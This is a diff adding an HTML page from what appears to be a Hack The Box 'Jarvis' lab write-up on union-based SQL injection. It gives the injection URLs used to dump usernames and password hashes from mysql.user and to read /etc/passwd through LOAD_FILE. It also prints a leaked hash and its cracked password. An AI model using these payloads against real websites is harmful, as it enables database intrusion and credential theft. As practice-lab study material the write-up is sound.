@@ -1,0 +1,54 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Error based Blind SQL Injection</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="styles.css" type="text/css" />
+</head>
+<body><div class="main"><div class="tree">
+<p><strong>Index</strong></p>
+<p><a href="HacktheBox--Linux_Boxes--jarvis.html">jarvis</a></p>
+
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--nmapAutomator.html">nmapAutomator</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--gobuster.html">gobuster</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--initial_foothold.html">initial foothold</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--initial_foothold--manual_sqlinjection_(Blind_SQL_injection).html">manual sqlinjection (Blind SQL injection)</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--initial_foothold--manual_sqlinjection_(Blind_SQL_injection)--Error_based_Blind_SQL_Injection.html">Error based Blind SQL Injection</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--initial_foothold--manual_sqlinjection_(Blind_SQL_injection)--revshell.php.html">revshell.php</a></li>
+<li><a href="-jarvis--initial_foothold--manual_sqlinjection_(Blind_SQL_injection)--Exploit_the_SQL_injection_to_add_php_code_into_a_file_on_the_system.html">Exploit the SQL injection to add php code into a file on the system</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--initial_foothold--manual_sqlinjection_(Blind_SQL_injection)--reverse_shell.html">reverse shell</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--initial_foothold--sqlmap.html">sqlmap</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--initial_foothold--sqlmap--sqlmap_--os-shell.html">sqlmap --os-shell</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_pepper.html">privesc to pepper</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_pepper--simpler.py.html">simpler.py</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_pepper--simpler.py--ping_method.html">ping method</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_pepper--simpler.py_privesc.html">simpler.py privesc</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_root.html">privesc to root</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_root--linEnum.sh.html">linEnum.sh</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_root--linEnum.sh--SUID_files.html">SUID files</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_root--lse.sh.html">lse.sh</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_root--system.ctl_GTFO.html">system.ctl GTFO</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_root--system.ctl_GTFO--Systemctl_misconfigured_permissions_sudo-SUID.html">Systemctl misconfigured permissions sudo/SUID</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_root--system.ctl_GTFO--root.service.html">root.service</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--lessons_learned.html">lessons learned</a></li>
+</ol></div>
+<div class="page"><h1><b><u>Error based Blind SQL Injection</u></b></h1><span style="color:#24ff00;">Error Based Database Enumeration</span><br /><br /><span style="color:#24ff00;">now that we know the correct number of database columns, we can substitute in a valid </span><span style="color:#ffa500;">mySQL</span><span style="color:#24ff00;"> query in one of the columns! take for example the simple query</span><br /><span style="color:#ffa500;">SELECT user FROM mysql.user</span><br /><span style="color:#24ff00;">subbing it makes our orginal union select statement look like this:</span><br /><span style="color:#ffa500;">http://10.10.10.143/room.php?cod=9999 union select 1,(SELECT user FROM mysql.user),3,4,5,6,7</span><br /><img src="images/515-1.png" alt="images/515-1.png" /><br /><img src="images/515-2.png" alt="images/515-2.png" /><br /><span style="color:#24ff00;">and we leaked DBadmin's username!</span><br /><span style="color:#ffff00;">user</span><span style="color:#24ff00;">=</span><span style="color:#ffff00;">DBadmin</span><br /><br /><br /><span style="color:#24ff00;">Great! we may even be able to leak the </span><span style="color:#ffff00;">password</span><span style="color:#24ff00;"> data as well from </span><span style="color:#ffa500;">mysql.user</span><span style="color:#24ff00;"> with the </span><br /><span style="color:#ffa500;">SELECT password FROM mysql.user</span><br /><span style="color:#24ff00;">subbing it in looks like the following:</span><br /><span style="color:#ffa500;">http://10.10.10.143/room.php?cod=9999 union select 1,(SELECT password FROM mysql.user),3,4,5,6,7</span><br /><img src="images/515-3.png" alt="images/515-3.png" /><br /><img src="images/515-4.png" alt="images/515-4.png" /><br /><span style="color:#24ff00;">and we leaked </span><span style="color:#ffff00;">DBadmin's </span><span style="color:#24ff00;">password hash!</span><br /><span style="color:#ffff00;">password</span><span style="color:#ffa500;">=</span><span style="color:#ffff00;">2D2B7A5E4E637B8FBA1D17F40318F277D29964D0</span><br /><br /><br /><br /><span style="color:#24ff00;">we can also use the </span><span style="color:#ffa500;">group_concat() </span><span style="color:#24ff00;">mysql function to combine different database objects to one string, enumerating/outputting their contents all at once</span><br /><span style="color:#ffa500;">http://10.10.10.143/room.php?cod=9999 union select 1,(SELECT group_concat(host,user,password) FROM mysql.user),3,4,5,6,7</span><br /><img src="images/515-5.png" alt="images/515-5.png" /><br /><img src="images/515-6.png" alt="images/515-6.png" /><br /><br /><span style="color:#24ff00;">another mysql function we can play around with is the </span><span style="color:#ffa500;">LOAD_FILE(&lt;file location&gt;)</span><span style="color:#24ff00;"> function, which is practically like a local file inclusion vulnerability we've seen before, we can leak senstitive files from our victim this way! Lets try outputting /etc/passwd</span><br /><br /><span style="color:#ffa500;">http://10.10.10.143/room.php?cod=9999 union select 1,LOAD_FILE('/etc/passwd'),3,4,5,6,7</span><br /><img src="images/515-7.png" alt="images/515-7.png" /><br /><img src="images/515-8.png" alt="images/515-8.png" /><br /><br /><br /><br /><span style="color:#ffff00;">2D2B7A5E4E637B8FBA1D17F40318F277D29964D0</span><span style="color:#24ff00;"> lets throw this hash in crackstation </span><br /><img src="images/515-9.png" alt="images/515-9.png" /><br /><span style="color:#24ff00;">and just like that, we've leaked </span><span style="color:#ffff00;">dbadmin's</span><span style="color:#24ff00;"> password </span><span style="color:#ffff00;">imissyou</span></div></div>
+</body></html>
